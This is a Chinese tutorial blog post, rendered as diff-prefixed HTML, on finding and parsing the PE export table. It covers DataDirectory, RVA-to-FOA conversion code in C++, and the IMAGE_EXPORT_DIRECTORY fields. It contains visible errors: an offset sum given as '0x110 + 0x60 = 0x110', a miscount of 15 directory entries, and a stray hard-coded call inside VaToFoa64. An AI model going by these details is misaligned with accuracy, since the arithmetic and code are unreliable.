+<p><strong>个人理解</strong>，PE文件中的导入表像是C/C++中的#include <xxx> 包含另一个文件来使用其中的函数，导出表便是其头文件，可使用的函数便是头文件中所声明的函数那般。</xxx></p>
+<h2 id="何为导出表？"><a href="#何为导出表？" class="headerlink" title="何为导出表？"></a>何为导出表？</h2><p>导出表便是记录该PE文件提供给其他PE文件的函数的一种结构</p>
+<h3 id="定位导出表"><a href="#定位导出表" class="headerlink" title="定位导出表"></a>定位导出表</h3><h4 id="定位导出表的原理"><a href="#定位导出表的原理" class="headerlink" title="定位导出表的原理"></a>定位导出表的原理</h4><p>导出表的定位可以利用PE文件_IMAGE_OPTIONAL_HEADER32中的DataDirectory结构进行定位。</p>
+<p>DataDirecoty是一个长为16的数组，<strong>每个数组成员对应一个表</strong></p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">成员										数据宽度</span><br><span class="line"></span><br><span class="line">DataDirectory[<span class="number">16</span>] 	IMAGE_DATA_DIRECTORY[<span class="number">16</span>]=<span class="number">128</span>字节</span><br></pre></td></tr></table></figure>
+
+<p>数据目录中共有16个表</p>
+<p>根据表的结构可知，导出表的下标为0</p>
+<p>即DataDirectory[0]表示导出表</p>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014165215769.png" alt="image-20211014165215769"></p>
+<p>根据c语言中，该成员在扩展PE头中的定义</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br></pre></td></tr></table></figure>
+
+<p>可以看到数组成员的结构为IMAGE_DATA_DIRECTORY</p>
+<p><strong>IMAGE_DATA_DIRECTORY</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure>
+
+<p>这样的结构于扩展PE头内有15个</p>
+<table>
+<thead>
+<tr>
+<th>IMAGE_DATA_DIRECTORY成员</th>
+<th>数据宽度</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>VirtualAddress</td>
+<td>DWORD(4字节)</td>
+<td>表的起始位置（RVA）</td>
+</tr>
+<tr>
+<td>Size</td>
+<td>DWORD(4字节)</td>
+<td>表的大小</td>
+</tr>
+</tbody></table>
+<p>VirtualAddress 意为一个相对虚拟地址(RVA)</p>
+<p>Size： 表的大小</p>
+<p>根据VirtualAddress 与 Size 可求出该表的范围。</p>
+<p>同时，IMAGE_DATA_DIRECTORY<strong>仅仅记录表的位置和大小，没有描述表的具体结构</strong></p>
+<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p>1.找到IMAGE_OPTIONAL_HEADER32的最后一个成员DataDirectory</p>
+<p>2.获取DataDirectory[0]</p>
+<p>3.根据DataDirectory[0].virtualAddress得到导出表的RVA</p>
+<p>4.将导出表的RVA转换为FOA，利用16进制编辑器定位导出表</p>
+<p>RVA = 区块.VirtualAddress + 差值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">### RVA 转 FOA 计算方式</span><br><span class="line"></span><br><span class="line">若RVA不在PE头内:</span><br><span class="line"></span><br><span class="line">差值 = RVA - 区块.VirtualAddress</span><br><span class="line"></span><br><span class="line">FOA = 区块.PointerToRawData + 差值</span><br><span class="line"></span><br><span class="line">若在PE头内:</span><br><span class="line"></span><br><span class="line">RVA = FOA</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析实例</strong></p>
+<p>以lyl610abc师傅于文中公布的dll文件为例，进行调试</p>
+<p>导出函数的声明定义</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">EXPORTS</span><br><span class="line">Add @<span class="number">12</span> </span><br><span class="line">Sub @<span class="number">15</span> NONAME</span><br><span class="line">Multiply @<span class="number">17</span></span><br><span class="line">Divide @<span class="number">10</span></span><br></pre></td></tr></table></figure>
+
+<p>具体导出函数定义</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">Add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">Sub</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x-y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">Multiply</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x * y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">Divide</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x / y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="找到DataDirectory"><a href="#找到DataDirectory" class="headerlink" title="找到DataDirectory"></a>找到DataDirectory</h4><p>由于DataDirectory数据目录本身在PE头的扩展头部分，因此我们需要先获取到PE头的起始位，再根据IMAGE_NT_HEADERS结构的PE文件头标志大小+标准PE头大小达到扩展PE头：</p>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014191938589.png" alt="image-20211014191938589"></p>
+<p>演示DLL文件为PE32文件，因此PE格式的标准头文件为 IMAGE_NT_HEADERS：</p>
+<p>扩展PE头首地址:0xF8+0x4+0x14(20) = 0x110</p>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014192704811.png" alt="image-20211014192704811"></p>
+<p>同时扩展PE头大小为224 字节，数据目录(DATADirectory大小) = _IMAGE_DATA_DIRECTORY大小*16 = 8 *16 = 128</p>
+<p>因此224 - 128 = 96个字节</p>
+<p>因此扩展PE头起始地址+ 96字节后为DataDirectory结构的起始地址</p>
+<p>DataDirectory起始地址 = 扩展头地址+ 0x60(96) = 0x110 + 0x60 = 0x110 </p>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014195234440.png" alt="image-20211014195234440"></p>
+<p>由此拿到DataDirectory，顺序排放DataDirectory[0] ~ DataDirectory[15] 8字节一张表</p>
+<p>DataDirectory[0] 对应着导出表</p>
+<table>
+<thead>
+<tr>
+<th>IMAGE_DATA_DIRECTORY成员</th>
+<th>值</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>VirtualAddress</td>
+<td>0x00018FB0</td>
+<td>表的起始位置（RVA）</td>
+</tr>
+<tr>
+<td>Size</td>
+<td>0x00000190</td>
+<td>表的大小</td>
+</tr>
+</tbody></table>
+<h4 id="得到导出表的RVA"><a href="#得到导出表的RVA" class="headerlink" title="得到导出表的RVA"></a>得到导出表的RVA</h4><p>根据结构拿到导出表<strong>RVA</strong>值为: 0x018FB0</p>
+<p>导出表的<strong>size</strong>为: 0x0190</p>
+<h4 id="RVA转换FOA"><a href="#RVA转换FOA" class="headerlink" title="RVA转换FOA"></a><strong>RVA转换FOA</strong></h4><p>但是IMAGE_DATA_DIRECTORY中的VirtualAddress 是RVA它在内存中才有的用， 在磁盘文件下需要将其转换成FOA</p>
+<p>直接利用代码获取对应的FOA:</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PE.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="comment">//在VC6这个比较旧的环境里，没有定义64位的这个宏，需要自己定义，在VS2019中无需自己定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AMD64  0x8664</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 32位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa32</span><span class="params">(UINT va, _IMAGE_DOS_HEADER *dos,_IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew+<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd) &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);        </span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize ,(UINT)sectionArr[i]-&gt;SizeOfRawData ) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment)* nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory)) &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            UINT offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            UINT foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 64位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa64</span><span class="params">(UINT va, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS64* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd) &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);</span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize ,(UINT)sectionArr[i]-&gt;SizeOfRawData ) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment)* nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory)) &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">				<span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x18FB0</span>,dos,(_IMAGE_NT_HEADERS*)nt,sectionArr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            <span class="keyword">int</span> offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            <span class="keyword">int</span> foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//创建DOS对应的结构体指针</span></span><br><span class="line">    _IMAGE_DOS_HEADER* dos;</span><br><span class="line">    <span class="comment">//读取文件，返回文件句柄</span></span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFileA</span>(<span class="string">&quot;C:\\Users\\86156\\Desktop\\mydll.dll&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//根据文件句柄创建映射</span></span><br><span class="line">    HANDLE hMap = <span class="built_in">CreateFileMappingA</span>(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//映射内容</span></span><br><span class="line">    LPVOID pFile = <span class="built_in">MapViewOfFile</span>(hMap, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//类型转换，用结构体的方式来读取</span></span><br><span class="line">    dos = (_IMAGE_DOS_HEADER*)pFile;</span><br><span class="line">    <span class="comment">//输出dos-&gt;e_magic，以十六进制输出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dos-&gt;e_magic:%X\n&quot;</span>, dos-&gt;e_magic);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向PE文件头标志的指针</span></span><br><span class="line">    DWORD* peId;</span><br><span class="line">    <span class="comment">//让PE文件头标志指针指向其对应的地址=DOS首地址+偏移</span></span><br><span class="line">    peId = (DWORD*)((UINT)dos + dos-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">//输出PE文件头标志，其值应为4550，否则不是PE文件</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;peId:%X\n&quot;</span>, *peId);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向可选PE头的第一个成员magic的指针</span></span><br><span class="line">    WORD* magic;</span><br><span class="line">    <span class="comment">//让magic指针指向其对应的地址=PE文件头标志地址+PE文件头标志大小+标准PE头大小</span></span><br><span class="line">    magic = (WORD*)((UINT)peId + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD) + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_FILE_HEADER));</span><br><span class="line">    <span class="comment">//输出magic，其值为0x10b代表32位程序，其值为0x20b代表64位程序</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;magic:%X\n&quot;</span>, *magic);</span><br><span class="line">    <span class="comment">//根据magic判断为32位程序还是64位程序</span></span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (*magic) &#123;</span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR32_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;32位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为32位程序后，就可以使用_IMAGE_NT_HEADERS来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS* nt;</span><br><span class="line">        <span class="comment">//让PE文件头指针指向其对应的地址</span></span><br><span class="line">        nt = (_IMAGE_NT_HEADERS*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**) <span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span>(cnt&lt; nt-&gt;FileHeader.NumberOfSections)&#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER)*cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x18FB0</span>,dos,(_IMAGE_NT_HEADERS*)nt,sectionArr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR64_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;64位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为64位程序后，就可以使用_IMAGE_NT_HEADERS64来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS64* nt;</span><br><span class="line">        nt = (_IMAGE_NT_HEADERS64*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址，区别在于这里加上的偏移为_IMAGE_NT_HEADERS64</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span> (cnt &lt; nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER) * cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键代码</strong></p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x18FB0</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>
+
+<p>由于之前的函数是VA转FOA，这边我们拿到的是RVA,因此想要正确利用，需要用到RVA + ImageBase得到VA</p>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014201121563.png" alt="image-20211014201121563"></p>
+<p>自此拿到FOA为:0x79B0</p>
+<h2 id="导出表的结构"><a href="#导出表的结构" class="headerlink" title="导出表的结构"></a>导出表的结构</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>可以定位到导出表后下一步便是要了解导出表的结构，才能解读导出表的信息</p>
+<p>C语言中的结构体(Winnt.h可以找到)，本结构在C语言中长40字节，导出表范围:导出表首地址(FOA)+导出表长度-1 (减1是由于导出表首地址也占一个字节)</p>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014203245039.png" alt="image-20211014203245039"></p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   Base;</span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// RVA from base of image</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>结构体分析</strong></p>
+<table>
+<thead>
+<tr>
+<th>成员</th>
+<th>数据宽度</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Characteristics</td>
+<td>DWORD(4字节)</td>
+<td>标志，未用</td>
